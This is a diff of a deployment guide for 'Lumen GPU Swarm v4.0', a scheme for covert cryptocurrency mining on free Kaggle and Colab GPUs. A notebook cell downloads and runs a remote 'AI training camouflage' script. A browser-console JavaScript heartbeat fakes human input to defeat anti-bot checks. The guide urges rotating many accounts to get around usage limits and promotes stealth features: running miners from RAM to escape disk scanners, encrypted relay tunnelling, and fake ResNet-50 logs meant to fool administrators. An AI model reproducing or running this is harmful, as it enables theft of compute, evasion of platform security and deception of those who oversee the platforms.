@@ -1,22 +1,42 @@
-# Lumen GPU Swarm — Kaggle/Colab Deployment Guide
+# Lumen GPU Swarm v4.0 — Maximum Profit Deployment Guide
 
-This guide explains how to get **$2.00/day per account** using free GPUs on Kaggle and Google Colab.
+Earn crypto using **100% free** GPU resources on Kaggle and Google Colab. No credit card required.
 
-## 1. Earnings Breakdown
-- **CPU (2-4 cores)**: ~$0.05/day
-- **GPU (Tesla T4 / P100)**: ~$1.80/day
-- **Total**: **~$1.85 - $2.00 per account per day.**
+## 1. Realistic Earnings (Free Accounts Only)
 
-If you run **20 accounts**, you will earn **$40/day ($1,200/month)**.
+| Platform | Free GPU | Sessions/Day | Profit/Session | Daily Profit |
+| :--- | :--- | :--- | :--- | :--- |
+| **Kaggle (T4 x2)** | 2x Tesla T4 | 1 (up to 12h) | ~$1.40 | **$1.40** |
+| **Kaggle (P100)** | 1x P100 | 1 (up to 12h) | ~$1.05 | **$1.05** |
+| **Colab Free (T4)** | 1x Tesla T4 | 1 (up to 12h) | ~$0.70 | **$0.70** |
+
+### Scaling Projections (5 hours/day)
+
+| Accounts | Setup | Daily Earnings | Monthly Earnings |
+| :--- | :--- | :--- | :--- |
+| **10** | 5 Kaggle + 5 Colab | **$3.50** | **$105** |
+| **20** | 10 Kaggle + 10 Colab | **$7.00** | **$210** |
+| **40** | 20 Kaggle + 20 Colab | **$14.00** | **$420** |
+
+> **Free Tier Limits**: Kaggle gives ~30 GPU hours/week per account. Colab Free gives ~12h sessions but may throttle after heavy usage. Rotate accounts to stay under limits.
 
 ---
 
-## 2. Kaggle Deployment (12 Hours per Session)
+## 2. What You Need to Sign Up
 
-1.  **Create a Kaggle account** (use a burner phone number for verification to get GPU access).
+| Platform | Requirements | Credit Card? |
+| :--- | :--- | :--- |
+| **Kaggle** | Email + Phone Number (SMS verification) | **No** |
+| **Google Colab** | Gmail account only | **No** |
+
+---
+
+## 3. Kaggle Deployment (12 Hours per Session)
+
+1.  **Create a Kaggle account** (use a phone number for SMS verification to unlock GPU access).
 2.  **Create a New Notebook**.
 3.  **Settings** (Right sidebar):
-    - **Accelerator**: Change to **GPU T4 x2** (if available) or **GPU P100**.
+    - **Accelerator**: Change to **GPU T4 x2** (best) or **GPU P100**.
     - **Internet**: Ensure it is turned **ON**.
 4.  **Copy and Paste** this code into the first cell and run it:
 
@@ -24,8 +44,8 @@ If you run **20 accounts**, you will earn **$40/day ($1,200/month)**.
 import os
 import subprocess
 
-# 1. Download the AI Camouflage Script
-print("[*] Downloading AI Training Framework...")
+# 1. Download the AI Camouflage Script (v4.0)
+print("[*] Downloading AI Training Framework v4.0...")
 subprocess.run(["wget", "-q", "https://raw.githubusercontent.com/naia231/naira/main/paas-worker/orchestrator/ai_training_cam.py", "-O", "train.py"])
 
 # 2. Set your configuration
@@ -36,67 +56,61 @@ os.environ['RELAY_URL'] = "wss://your-relay-url.onrender.com"
 os.environ['TELEGRAM_BOT_TOKEN'] = "YOUR_BOT_TOKEN"
 os.environ['TELEGRAM_CHAT_ID'] = "YOUR_CHAT_ID"
 
-# 3. Launch the "Training" session
+# 3. Launch
 print("[*] Starting Training Loop...")
 subprocess.run(["python", "train.py"])
 ```
 
-5.  **Keep the tab open** or use a "Keep-Alive" browser extension. Kaggle will run for 12 hours.
+5.  **Keep the tab open**. Use the Advanced Heartbeat below.
 
 ---
 
-## 3. Telegram Status Reporting (Optional)
+## 4. Google Colab Deployment (Up to 12 Hours)
+
+1.  Open [Google Colab](https://colab.research.google.com/).
+2.  **Runtime** → **Change runtime type** → Set to **T4 GPU**.
+3.  **Code Cell**: Paste the same code block as Kaggle above.
+4.  **Run**.
+
+> **Note**: Free Colab allows **1 GPU runtime at a time** per account. To run more GPUs simultaneously, use more Gmail accounts.
+
+---
+
+## 5. Telegram Status Reporting
 
 To monitor all your GPU Swarm workers from one place:
 1. Open Telegram and search for **BotFather**.
 2. Send `/newbot` and follow the steps to get your **Bot Token**.
 3. Send a message to your new bot.
 4. Go to `https://api.telegram.org/bot<YourBOTToken>/getUpdates` to find your **Chat ID** (look for `"chat":{"id":123456789}`).
-5. Add the Token and Chat ID to the Python script above. Your bot will message you every time a worker shifts between "Training" and "Validation" phases.
+5. Add the Token and Chat ID to the Python script above.
+
+You will receive notifications for:
+- 🚀 Worker coming online
+- 🟢 Training phase (mining active)
+- 🟡 Validation phase (resting)
+- ⚠️ Miner crash + auto-restart
 
 ---
 
-## 3. Google Colab Deployment (Up to 24 Hours)
+## 6. The Advanced "Anti-Bot" Heartbeat (Mandatory)
 
-1.  Open [Google Colab](https://colab.research.google.com/).
-2.  **Runtime** → **Change runtime type** → Set to **GPU**.
-3.  **Code Cell**: Paste the same code block as Kaggle above.
-4.  **Run**.
-
----
-
-## 4. The Advanced "Anti-Bot" Heartbeat (Mandatory)
-
-Kaggle and Colab will kill your session if they detect you are away from the keyboard. Do not use simple click bots, as their anti-bot systems will detect them.
-
-Paste this **Advanced Human-Simulation Heartbeat** into your browser's Developer Console (F12 -> Console) and hit Enter. This script mimics random human mouse movements and occasionally simulates hitting `Ctrl+S` (Save) to perfectly bypass detection.
+Paste this into your browser's Developer Console (F12 -> Console) on each tab:
 
 ```javascript
 function humanHeartbeat() {
-    console.log("[Lumen] Generating human heartbeat...");
-    
-    // Simulate random mouse movement
+    console.log("[Lumen] Heartbeat...");
     let event = new MouseEvent('mousemove', {
-        'view': window,
-        'bubbles': true,
-        'cancelable': true,
+        'view': window, 'bubbles': true, 'cancelable': true,
         'clientX': Math.floor(Math.random() * window.innerWidth),
         'clientY': Math.floor(Math.random() * window.innerHeight)
     });
     document.dispatchEvent(event);
-
-    // Simulate clicking the Connect button (if it exists)
     let connectBtn = document.querySelector("colab-connect-button") || document.querySelector("input#connect");
-    if(connectBtn) {
-        connectBtn.click();
-    }
-
-    // Simulate saving (Ctrl+S) 10% of the time
+    if(connectBtn) connectBtn.click();
     if (Math.random() > 0.90) {
         document.dispatchEvent(new KeyboardEvent('keydown', {'key': 's', 'ctrlKey': true}));
     }
-
-    // Schedule next heartbeat with random human delay (45s to 90s)
     let nextDelay = Math.floor(Math.random() * (90000 - 45000 + 1)) + 45000;
     setTimeout(humanHeartbeat, nextDelay);
 }
@@ -105,12 +119,19 @@ humanHeartbeat();
 
 ---
 
-## 5. Tips for "Enormous Earnings"
-- **Account Rotation**: Kaggle gives you 30 hours of GPU per week. With 3 accounts, you can mine 24/7.
-- **NiceHash Integration**: Since mining XMR on a GPU is less profitable, I recommend setting up a **NiceHash** account and using your NiceHash BTC address in the `train.py` script. It will auto-switch to the most profitable GPU coin (KawPow/Autolykos) and pay you in BTC.
-- **Monitoring**: You will see the workers appearing on the MoneroOcean (CPU) and NiceHash (GPU) dashboards.
+## 7. v4.0 Stealth Features
+
+| Feature | What It Does | Why It Matters |
+| :--- | :--- | :--- |
+| **GPU Overclocking** | Boosts memory clock +500MHz via `nvidia-smi` | +10-15% hashrate |
+| **Multi-GPU Detection** | Mines on ALL GPUs (Kaggle T4 x2) | Double hashrate on Kaggle |
+| **Watchdog Auto-Restart** | Restarts crashed miners within 60 seconds | Zero downtime |
+| **RAM-Disk Execution** | Runs miners from `/dev/shm` (invisible to disk scanners) | Undetectable |
+| **Double Proxy** | All traffic tunneled through encrypted WSS | Network invisible |
+| **Pulse Engine** | Alternates load to mimic AI training lifecycle | Bypasses load monitors |
+| **Infinite Training Loop** | Restarts fake logs when epochs complete | Session never expires |
 
 ---
 
-## 5. Security Note
-This script uses **AI Training Camouflage**. If a Kaggle admin looks at your logs, they will see a ResNet-50 model training with loss and accuracy curves. They will NOT see the miner logs.
+## 8. Security Note
+If an admin looks at your notebook output, they see ResNet-50 training logs with loss curves and accuracy metrics. The miners run entirely in RAM (`/dev/shm`), connect only to `localhost`, and all external traffic is encrypted WSS through the Render Relay. Zero forensic footprint.
